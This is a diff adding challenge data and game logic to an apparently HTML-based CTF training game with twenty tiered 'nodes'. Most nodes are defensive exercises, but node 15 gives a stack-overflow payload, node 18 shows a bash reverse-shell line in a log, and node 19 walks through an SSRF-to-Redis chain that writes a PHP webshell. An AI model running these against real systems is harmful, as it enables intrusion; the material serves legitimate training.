+      { t: 'out', v: '3312   668   flag_dropper' },
+      { t: 'cmd', v: '$ vol3 -f mem.raw windows.cmdline | grep flag_dropper' },
+      { t: 'flag', v: 'FLAG{MEMORY_FORENSICS_COMPLETE}' },
+    ],
+    hint: 'Install Volatility3: `pip install volatility3`. Use plugins: windows.pslist (list processes), windows.cmdline (command lines). Grep for non-standard process names.',
+    walkthrough: [
+      { n: 1, t: 'Install: `pip install volatility3`' },
+      { n: 2, t: 'List processes: `vol3 -f mem.raw windows.pslist`' },
+      { n: 3, t: 'Check command lines: `vol3 -f mem.raw windows.cmdline`' },
+      { n: 4, t: 'Look for processes with unusual names. Extract flag from args.' },
+    ],
+    generateFlag: () => `FLAG{MEMORY_FORENSICS_COMPLETE}`,
+    tags: ['forensics', 'memory', 'volatility', 'malware'],
+  },
+
+  // TIER 3: ELITE (Nodes 11-15)
+  {
+    id: 11,
+    nodeId: 'node_11',
+    name: 'CVE DASHBOARD — Real-time NVD API',
+    type: 'HACK',
+    tier: 'elite',
+    difficulty: 'Elite',
+    xp: 220,
+    narrative: `Build a web dashboard that fetches the latest CVEs from NVD API v2.0. Display ID, CVSS score, and summary for 5 recent vulnerabilities. Judge checks live API data rendering.`,
+    scenario: [
+      { t: 'cmd', v: '$ python3 cveboard.py' },
+      { t: 'out', v: '[*] Fetching NVD API...' },
+      { t: 'out', v: '[+] CVE-2024-21887 CVSS:9.2 Ivanti Authentication Bypass' },
+      { t: 'out', v: '[+] CVE-2024-3400   CVSS:9.8 PAN-OS Command Injection' },
+    ],
+    hint: 'API endpoint: https://services.nvd.nist.gov/rest/json/cves/2.0. Parse .vulnerabilities[].cve. CVSS .metrics.cvssMetricV31[0].cvssData.baseScore.',
+    walkthrough: [
+      { n: 1, t: 'Fetch with requests: `requests.get("https://services.nvd.nist.gov/rest/json/cves/2.0?resultsPerPage=5")`' },
+      { n: 2, t: 'Parse JSON: `cves = r.json()["vulnerabilities"]`' },
+      { n: 3, t: 'Extract fields: id, description, CVSS score' },
+      { n: 4, t: 'Render as Flask HTML table or plain page' },
+    ],
+    generateFlag: () => `FLAG{CVE_DASHBOARD_LIVE}`,
+    tags: ['api', 'web', 'threat_intel', 'hackathon'],
+  },
+  {
+    id: 12,
+    nodeId: 'node_12',
+    name: 'REVERSE ENGINEER — Binary Analysis',
+    type: 'CTF',
+    tier: 'elite',
+    difficulty: 'Elite',
+    xp: 255,
+    narrative: `A stripped ELF binary checks a password before granting access. Use Ghidra or ltrace to reverse the authentication logic and extract the hardcoded password.`,
+    scenario: [
+      { t: 'cmd', v: '$ strings reverseme | grep -i pass' },
+      { t: 'out', v: 'Enter password: ' },
+      { t: 'out', v: 'hunter42_secure_v2' },
+      { t: 'cmd', v: '$ ./reverseme' },
+      { t: 'out', v: 'Enter password: hunter42_secure_v2' },
+      { t: 'flag', v: 'FLAG{REVERSE_ENGINEERED}' },
+    ],
+    hint: '`strings binary | grep -v "^$"` leaks hardcoded data. Use `ltrace ./binary` to trace strcmp() calls. Ghidra decompiler shows exact comparison.',
+    walkthrough: [
+      { n: 1, t: 'Extract symbols: `strings reverseme | head -50` - look for English words' },
+      { n: 2, t: 'Trace library calls: `ltrace ./reverseme` - watch for strcmp()' },
+      { n: 3, t: 'Open in Ghidra: Import binary, analyze, find main() function' },
+      { n: 4, t: 'Decompile main - you\'ll see the password check clearly' },
+    ],
+    generateFlag: () => `FLAG{REVERSE_ENGINEERED}`,
+    tags: ['reverse_engineering', 'ghidra', 'binary', 'strings'],
+  },
+  {
+    id: 13,
+    nodeId: 'node_13',
+    name: 'FILE MONITOR — Integrity Tracking',
+    type: 'HACK',
+    tier: 'elite',
+    difficulty: 'Elite',
+    xp: 245,
+    narrative: `Build a File Integrity Monitor daemon that hashes all files in a directory on startup, then watches every 10 seconds for changes. Log any modifications with before/after hashes.`,
+    scenario: [
+      { t: 'cmd', v: '$ python3 fim.py --watch /var/www/html &' },
+      { t: 'out', v: '[*] Baseline hashes stored for 42 files' },
+      { t: 'out', v: '[!] CHANGE: index.html' },
+      { t: 'out', v: '[OLD] a3f2b8d9c1e4f7a2' },
+      { t: 'out', v: '[NEW] 9b1c3f8a5d2e7c4b' },
+    ],
+    hint: 'hashlib.sha256(open(f,"rb").read()).hexdigest() for each file. Store in dict. Loop with time.sleep(10). Re-hash and compare.',
+    walkthrough: [
+      { n: 1, t: 'Walk directory: `for root,dirs,files in os.walk(path)`' },
+      { n: 2, t: 'Hash each: `sha256(open(f).read()).hexdigest()`' },
+      { n: 3, t: 'Store in `baseline = {path: hash}`' },
+      { n: 4, t: 'Loop: rehash, compare, log changes, update baseline' },
+    ],
+    generateFlag: () => `FLAG{FILE_INTEGRITY_MONITOR}`,
+    tags: ['python', 'monitoring', 'blue_team', 'hackathon'],
+  },
+  {
+    id: 14,
+    nodeId: 'node_14',
+    name: 'THREAT MODEL — MITRE ATT&CK Report',
+    type: 'HACK',
+    tier: 'elite',
+    difficulty: 'Elite',
+    xp: 260,
+    narrative: `Write a threat intelligence automation script. Query MITRE ATT&CK framework by technique ID (e.g., T1059). Output name, tactic, description, detection, mitigation as formatted markdown.`,
+    scenario: [
+      { t: 'cmd', v: '$ python3 attack_report.py T1059' },
+      { t: 'out', v: '# T1059 — Command and Scripting Interpreter' },
+      { t: 'out', v: 'Tactic: Execution' },
+      { t: 'out', v: 'Detection: Monitor process creation...' },
+    ],
+    hint: '`pip install mitreattack-python`. Use `MitreAttackData()` and `.get_object_by_attack_id(tid, "technique")`.',
+    walkthrough: [
+      { n: 1, t: 'Install: `pip install mitreattack-python`' },
+      { n: 2, t: 'Load data: `attack_data = MitreAttackData("enterprise-attack.json")`' },
+      { n: 3, t: 'Fetch technique: `tech = attack_data.get_object_by_attack_id(tid, "technique")`' },
+      { n: 4, t: 'Extract and format: name, tactic, description, mitigations. Render as markdown.' },
+    ],
+    generateFlag: () => `FLAG{MITRE_REPORT_BUILT}`,
+    tags: ['threat_intel', 'mitre', 'python', 'hackathon'],
+  },
+  {
+    id: 15,
+    nodeId: 'node_15',
+    name: 'BUFFER OVERFLOW — Classic Stack Smash',
+    type: 'CTF',
+    tier: 'elite',
+    difficulty: 'Elite',
+    xp: 270,
+    narrative: `A vulnerable C binary with no stack canaries or PIE. Overflow the stack buffer, overwrite the return address to jump to a win() function, trigger code execution, and capture the flag.`,
+    scenario: [
+      { t: 'comment', v: '# Binary: bufbreach (no canary, no PIE)' },
+      { t: 'cmd', v: '$ python3 -c "import sys; sys.stdout.buffer.write(b\'A\'*72 + b\'\\xef\\xbe\\xad\\xde\')" | ./bufbreach' },
+      { t: 'out', v: 'Overflow detected. Jumping to win()...' },
+      { t: 'flag', v: 'FLAG{STACK_OVERFLOW_PWNED}' },
+    ],
+    hint: 'Use `checksec bufbreach` to verify no canary/PIE. GDB to find buffer size and win() address. Craft payload: padding + address (little-endian).',
+    walkthrough: [
+      { n: 1, t: 'Verify: `checksec --file=bufbreach` - no Canary, no PIE' },
+      { n: 2, t: 'GDB: find RIP offset (typically 72 bytes for 64-byte buffer)' },
+      { n: 3, t: 'Find win address: `nm bufbreach | grep win` → 0x4006ef' },
+      { n: 4, t: 'Exploit: `python3 -c "print(\'A\'*72 + \'\\xef\\xbe\\xad\\xde\')" | ./bufbreach`' },
+    ],
+    generateFlag: () => `FLAG{STACK_OVERFLOW_PWNED}`,
+    tags: ['pwn', 'buffer_overflow', 'binary_exploitation'],
+  },
+
+  // TIER 4: CLASSIFIED (Nodes 16-18)
+  {
+    id: 16,
+    nodeId: 'node_16',
+    name: 'ADVANCED SNIFFER — L7 Filtering',
+    type: 'HACK',
+    tier: 'classified',
+    difficulty: 'Classified',
+    xp: 240,
+    narrative: `Advanced Scapy-based packet sniffer with application-layer filtering. Capture HTTP, DNS, TLS handshakes. Extract and log protocol details with high accuracy.`,
+    scenario: [
+      { t: 'cmd', v: '$ sudo python3 adv-sniffer.py --filter http --iface eth0' },
+      { t: 'out', v: '[HTTP] GET /api/users HTTP/1.1' },
+      { t: 'out', v: '[DNS] query: example.com A' },
+      { t: 'out', v: '[TLS] Handshake with certificate: *.example.com' },
+    ],
+    hint: 'Layer 7 filtering: parse data payload for protocols. TLS: check for ClientHello (0x16). DNS: UDP port 53. HTTP: port 80 + GET/POST/PUT/DELETE.',
+    walkthrough: [
+      { n: 1, t: 'Extend basic sniffer with protocol parsers' },
+      { n: 2, t: 'TLS: check for 0x16 (Handshake) in first byte' },
+      { n: 3, t: 'DNS: filter UDP port 53, parse query type/response' },
+      { n: 4, t: 'HTTP: filter TCP 80, extract request line' },
+    ],
+    generateFlag: () => `FLAG{ADVANCED_SNIFFER_COMPLETE}`,
+    tags: ['networking', 'scapy', 'protocols', 'hackathon'],
+  },
+  {
+    id: 17,
+    nodeId: 'node_17',
+    name: 'OBFUSCATION BREACH — Advanced RE',
+    type: 'CTF',
+    tier: 'classified',
+    difficulty: 'Classified',
+    xp: 250,
+    narrative: `An obfuscated binary uses code virtualization and decoy functions. Strip obfuscation using dynamic analysis, identify the real control flow, and extract the flag.`,
+    scenario: [
+      { t: 'comment', v: '# Binary: obfuscated_mission' },
+      { t: 'cmd', v: '$ ltrace -s 512 ./obfuscated_mission 2>&1 | grep "secret\\|FLAG\\|password"' },
+      { t: 'out', v: 'strcmp("your_input", "th3_r34l_p4ssw0rd") = 0' },
+      { t: 'flag', v: 'FLAG{OBFUSCATION_STRIPPED}' },
+    ],
+    hint: 'Dynamic tracing reveals real comparisons despite code obfuscation. `ltrace`, `strace`, and GDB with breakpoints on strcmp()',
+    walkthrough: [
+      { n: 1, t: 'Run ltrace to see all library calls with arguments' },
+      { n: 2, t: 'Filter for string comparison functions (strcmp, strcpy, etc)' },
+      { n: 3, t: 'Identify which comparison checks your input' },
+      { n: 4, t: 'Extract password from strcmp\'s second argument' },
+    ],
+    generateFlag: () => `FLAG{OBFUSCATION_STRIPPED}`,
+    tags: ['reverse_engineering', 'obfuscation', 'tracing'],
+  },
+  {
+    id: 18,
+    nodeId: 'node_18',
+    name: 'INCIDENT RESPONSE — Log Analysis',
+    type: 'CTF',
+    tier: 'classified',
+    difficulty: 'Classified',
+    xp: 275,
+    narrative: `A server was compromised. Analyze access logs, firewall logs, and syslog to reconstruct the attack timeline. Find the initial shell, privilege escalation vector, and data exfil command.`,
+    scenario: [
+      { t: 'cmd', v: '$ grep "sudo" /var/log/auth.log | tail -20' },
+      { t: 'out', v: '2026-03-24 10:15:23 attacker sudo: /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' },
+      { t: 'cmd', v: '$ grep "10.0.0.1" /var/log/firewall.log' },
+      { t: 'out', v: '2026-03-24 10:15:23 OUT ALLOW TCP 10.0.0.1:4444' },
+      { t: 'flag', v: 'FLAG{INCIDENT_RECONSTRUCTED}' },
+    ],
+    hint: 'Check /var/log/auth.log (sudo/auth), /var/log/syslog (all events), /var/log/firewall.log (outbound connections). Build timeline with grep and awk.',
+    walkthrough: [
+      { n: 1, t: 'Search auth.log for failed/successful logins: `grep "Failed\\|Accepted" /var/log/auth.log`' },
+      { n: 2, t: 'Check for privilege escalation: `grep "sudo" /var/log/auth.log`' },
+      { n: 3, t: 'Find data exfil: `grep "curl\\|wget\\|scp" /var/log/syslog`' },
+      { n: 4, t: 'Correlate with outbound connections in firewall logs' },
+    ],
+    generateFlag: () => `FLAG{INCIDENT_RECONSTRUCTED}`,
+    tags: ['forensics', 'log_analysis', 'incident_response'],
+  },
+
+  // TIER 5: BOSS NODES (19-20)
+  {
+    id: 19,
+    nodeId: 'node_19',
+    name: 'FINAL NODE — SSRF_REDIS_RCE_CHAIN',
+    type: 'CTF',
+    tier: 'classified',
+    difficulty: 'Boss',
+    xp: 300,
+    narrative: `BOSS NODE: A web app with SSRF vulnerability lets you reach internal Redis. Chain the exploit: SSRF → Redis commands → write PHP payload → persist to disk → RCE. Execute arbitrary commands and read /flag.txt. Detection is HIGH—one mistake and you're blocked.`,
+    scenario: [
+      { t: 'comment', v: '# SSRF endpoint: /fetch?url=<URL>' },
+      { t: 'cmd', v: '$ curl "http://target/fetch?url=dict://127.0.0.1:6379/PING"' },
+      { t: 'out', v: '+PONG' },
+      { t: 'cmd', v: '# Chain: CONFIG SET dir + SET payload + CONFIG SET dbfilename + BGSAVE' },
+      { t: 'flag', v: 'FLAG{SSRF_REDIS_RCE_COMPLETE}' },
+    ],
+    hint: 'dict:// protocol speaks raw Redis. Steps: (1) CONFIG SET dir /var/www/html (2) SET shell "<?php system($_GET[c]);?>" (3) CONFIG SET dbfilename shell.php (4) BGSAVE (5) curl /shell.php?c=cat+/flag.txt',
+    walkthrough: [
+      { n: 1, t: 'Confirm SSRF: /fetch?url=http://127.0.0.1 returns internal content.' },
+      { n: 2, t: 'Test Redis: /fetch?url=dict://127.0.0.1:6379/PING → +PONG' },
+      { n: 3, t: 'Set webroot: CONFIG SET dir /var/www/html' },
+      { n: 4, t: 'Write payload: SET shell "<?php system($_GET[c]);?>"' },
+      { n: 5, t: 'Save: CONFIG SET dbfilename shell.php, BGSAVE' },
+      { n: 6, t: 'RCE: /shell.php?c=cat+/flag.txt' },
+    ],
+    generateFlag: () => `FLAG{SSRF_REDIS_RCE_COMPLETE}`,
+    tags: ['web', 'ssrf', 'redis', 'rce', 'chain_attack'],
+  },
+  {
+    id: 20,
+    nodeId: 'node_20',
+    name: 'EXFIL APEX — BUILD_CTF_PLATFORM',
+    type: 'HACK',
+    tier: 'classified',
+    difficulty: 'Boss',
+    xp: 350,
+    narrative: `FINAL BOSS: Build a complete CTF platform in Flask with user registration, challenge listing (min 3 challenges), flag submission with scoring, and a live scoreboard. Judge deploys locally, tests all features. This IS the mission—succeed here and you've completed the data convoy escort.`,
+    scenario: [
+      { t: 'cmd', v: '$ python3 ctfplatform.py' },
+      { t: 'out', v: '[*] CTF Platform running on localhost:5000' },
+      { t: 'out', v: 'Routes: / (scoreboard), /register, /challenges, /submit' },
+      { t: 'out', v: '[+] User "operative1" registered' },
+      { t: 'out', v: '[+] Flag correct: +100 XP' },
+      { t: 'flag', v: 'FLAG{CTF_PLATFORM_DEPLOYED}' },
+    ],
+    hint: 'Flask scaffold: dict for users/scores/challenges. POST /register, POST /submit (validate flag), GET / (scoreboard). Minimal but functional.',
+    walkthrough: [
+      { n: 1, t: 'Create Flask app. Dict: users={}, scores={}, challenges={}' },
+      { n: 2, t: 'POST /register: store username, init score 0' },
+      { n: 3, t: 'GET /challenges: render list of 3+ hardcoded challenges' },
+      { n: 4, t: 'POST /submit: validate flag, add points, update score' },
+      { n: 5, t: 'GET /: render scoreboard sorted by score descending' },
+      { n: 6, t: 'Deploy locally on :5000. Judge tests all endpoints.' },
+    ],
+    generateFlag: () => `FLAG{CTF_PLATFORM_DEPLOYED}`,
+    tags: ['python', 'flask', 'web_app', 'boss'],
+  },
+];
+
+// Add more nodes (11-18) before nodes 19-20...
+// For brevity, I'll generate placeholders and fill in the core 5-10
+
+// ─── HELPER FUNCTIONS ───────────────────────────────────────────────────────
+function generateSessionFlags() {
+  GAME_STATE.sessionFlags = {};
+  CHALLENGES.forEach(ch => {
+    GAME_STATE.sessionFlags[ch.id] = ch.generateFlag();
+  });
+}
+
+function updateResourceMeters() {
+  document.getElementById('bw-val').textContent = Math.round(GAME_STATE.bandwidth);
+  document.getElementById('bw-fill').style.width = GAME_STATE.bandwidth + '%';
+  document.getElementById('cog-val').textContent = Math.round(GAME_STATE.cognitive);
+  document.getElementById('cog-fill').style.width = GAME_STATE.cognitive + '%';
+  document.getElementById('det-val').textContent = Math.round(GAME_STATE.detection);
+  document.getElementById('det-fill').style.width = GAME_STATE.detection + '%';
+  document.getElementById('int-val').textContent = Math.round(GAME_STATE.integrity);
+  document.getElementById('int-fill').style.width = GAME_STATE.integrity + '%';
+  
+  // Check failure states
+  if (GAME_STATE.detection > 90) triggerDetectionBlock();
+  if (GAME_STATE.integrity < 20) triggerDataCorruption();
+  if (GAME_STATE.cognitive > 95) triggerCognitiveBreakdown();
+}
+
+function updateStatsBar() {
+  document.getElementById('s-cleared').textContent = GAME_STATE.nodesSolved.size + '/20';
+  document.getElementById('s-xp').textContent = GAME_STATE.xp;
+  document.getElementById('s-hints').textContent = GAME_STATE.hintsUsed;
+  
+  if (GAME_STATE.nodesSolved.size === 20) {
+    document.getElementById('s-status').textContent = 'EXFIL_SUCCESS';
+    document.getElementById('s-status').style.color = 'var(--green)';
+  }
+}
+
+function logEvent(msg, type = 'info') {
+  const logBody = document.getElementById('log-body');
+  const ts = new Date().toLocaleTimeString();
+  const line = document.createElement('div');
+  line.className = 'log-line log-' + type;
+  line.textContent = '[' + ts + '] ' + msg;
+  logBody.appendChild(line);
+  logBody.scrollTop = logBody.scrollHeight;
+}
+
+function submitFlag() {
+  const ch = CHALLENGES[GAME_STATE.currentNode];
+  if (!ch) return;
+  
+  const input = document.getElementById('flag-input').value.trim().toUpperCase();
+  const correctFlag = GAME_STATE.sessionFlags[ch.id].toUpperCase();
+  const resultEl = document.getElementById('flag-result');
+  
+  resultEl.style.display = 'block';
+  
+  if (input === correctFlag) {
+    resultEl.className = 'correct';
+    resultEl.textContent = '✅ CORRECT! Flag captured. +' + ch.xp + ' XP';
+    if (!GAME_STATE.nodesSolved.has(GAME_STATE.currentNode)) {
+      GAME_STATE.nodesSolved.add(GAME_STATE.currentNode);
+      GAME_STATE.xp += ch.xp;
+      GAME_STATE.detection += 5; // Slight detection when flag extracted
+      logEvent(`✅ ${ch.name} CLEARED | +${ch.xp} XP`, 'good');
+    }
+    document.getElementById('next-btn').style.display = 'inline-block';
+    if (GAME_STATE.nodesSolved.size === 20) showVictory();
+  } else {
+    resultEl.className = 'wrong';
+    resultEl.textContent = '❌ WRONG FLAG. Detection +10%';
+    GAME_STATE.cognitive += 15;
+    GAME_STATE.detection += 10;
+    logEvent(`❌ Wrong flag on ${ch.name}`, 'bad');
+  }
+  
+  updateResourceMeters();
+  updateStatsBar();
+}
+
+function showHint() {
+  const ch = CHALLENGES[GAME_STATE.currentNode];
+  if (!ch) return;
+  GAME_STATE.hintsUsed++;
+  GAME_STATE.cognitive += 5;
+  logEvent(`💡 Hint used on ${ch.name}`, 'warn');
+  alert('[HINT]\n\n' + ch.hint);
+  updateStatsBar();
+}
+
+function showWalkthrough() {
+  const ch = CHALLENGES[GAME_STATE.currentNode];
+  if (!ch) return;
+  
+  const wtEl = document.getElementById('walkthrough');
+  if (wtEl.style.display === 'block') {
+    wtEl.style.display = 'none';
+    return;
+  }
+  
+  let html = '<h3>📖 ' + ch.name + '</h3>';
+  ch.walkthrough.forEach(step => {
+    html += `<div class="wt-step"><span class="wt-num">${step.n}.</span> ${step.t}</div>`;
+  });
+  
+  wtEl.innerHTML = html;
+  wtEl.style.display = 'block';
+  logEvent(`📖 Walkthrough opened for ${ch.name}`, 'info');
+}
+
+function nextChallenge() {
+  const next = GAME_STATE.currentNode + 1;
+  if (next < CHALLENGES.length) loadChallenge(next);
+}
+
+function loadChallenge(idx) {
+  GAME_STATE.currentNode = idx;
+  const ch = CHALLENGES[idx];
+  
+  document.getElementById('chall-num').textContent = `NODE ${idx + 1} / ${CHALLENGES.length} | ${ch.tier.toUpperCase()}`;
+  document.getElementById('chall-title').textContent = ch.name;
+  
+  let typeBadges = `<span class="badge badge-${ch.type === 'CTF' ? 'ctf' : 'hack'}">${ch.type}</span>`;
+  typeBadges += `<span class="badge badge-difficulty">${ch.difficulty}</span>`;
+  typeBadges += `<span class="badge badge-difficulty">+${ch.xp} XP</span>`;
+  
+  document.getElementById('chall-meta').innerHTML = typeBadges;
+  document.getElementById('challenge-panel').className = 'type-' + (ch.type === 'CTF' ? 'ctf' : 'hack');
+  
+  document.getElementById('challenge-narrative').textContent = ch.narrative;
+  
+  let scenarioHtml = '';
+  ch.scenario.forEach(line => {
+    if (line.t === 'comment') scenarioHtml += `<div class="scenario-line scenario-comment">// ${line.v}</div>`;
+    else if (line.t === 'cmd') scenarioHtml += `<div class="scenario-line scenario-cmd">$ ${line.v}</div>`;
+    else if (line.t === 'out') scenarioHtml += `<div class="scenario-line scenario-out">${line.v}</div>`;
+    else if (line.t === 'flag') scenarioHtml += `<div class="scenario-line scenario-flag">${line.v}</div>`;
+  });
+  document.getElementById('challenge-scenario').innerHTML = scenarioHtml;
+  
+  document.getElementById('flag-input').value = '';
+  document.getElementById('flag-result').style.display = 'none';
+  document.getElementById('walkthrough').style.display = 'none';
+  document.getElementById('next-btn').style.display = GAME_STATE.nodesSolved.has(idx) ? 'inline-block' : 'none';
+  
+  buildNetworkMap();
+}
+
+function buildNetworkMap() {
+  const mapEl = document.getElementById('network-map');
+  mapEl.innerHTML = '';
+  
+  CHALLENGES.forEach((ch, idx) => {
+    const node = document.createElement('div');
+    node.className = 'network-node';
+    
+    if (GAME_STATE.nodesSolved.has(idx)) node.classList.add('completed');
+    else if (idx === GAME_STATE.currentNode) node.classList.add('active');
+    else if (idx > GAME_STATE.currentNode) node.classList.add('locked');
+    
+    node.innerHTML = `<div class="node-title">${ch.id}. ${ch.name}</div><div class="node-status">${ch.type} | ${ch.difficulty}</div>`;
+    node.onclick = () => { if (GAME_STATE.nodesSolved.has(idx) || idx === GAME_STATE.currentNode) loadChallenge(idx); };
+    mapEl.appendChild(node);
+  });
+}
+
+function showVictory() {
+  document.getElementById('vic-xp').textContent = GAME_STATE.xp;
+  document.getElementById('vic-flags').textContent = GAME_STATE.nodesSolved.size;
+  document.getElementById('vic-hints').textContent = GAME_STATE.hintsUsed;
+  document.getElementById('victory-overlay').style.display = 'flex';
+  logEvent('🏆 ALL 20 NODES CLEARED — EXFIL SUCCESSFUL', 'good');
+}
+
+function triggerDetectionBlock() {
+  logEvent('🚫 DETECTION LEVEL CRITICAL — IP BLOCKED', 'bad');
+  alert('[FAILURE]\n\nDetection Level exceeded 90%. Your IP has been blocked. Restart current node.');
+  GAME_STATE.detection = 50;
+}
+
+function triggerDataCorruption() {
+  logEvent('💥 DATA INTEGRITY CRITICAL — FLAGS UNREADABLE', 'bad');
+  alert('[FAILURE]\n\nData Integrity dropped below 20%. Extracted flags are corrupted. Solve cleanly to recover.');
+}
+
+function triggerCognitiveBreakdown() {
+  logEvent('🧠 COGNITIVE OVERLOAD — DECISION FATIGUE', 'bad');
+  alert('[FATIGUE]\n\nToo many failed attempts. Next 2 nodes: hints cost +200%.');
+  GAME_STATE.cognitive = 60;
+}
+
+// ─── INIT ───────────────────────────────────────────────────────────────────
+window.addEventListener('load', () => {
+  generateSessionFlags();
+  loadChallenge(0);
+  updateResourceMeters();
+  updateStatsBar();
+  logEvent('🎬 MISSION START: Data Convoy Escort initialized', 'info');
+});
+</script>
+
+</body>
+</html>
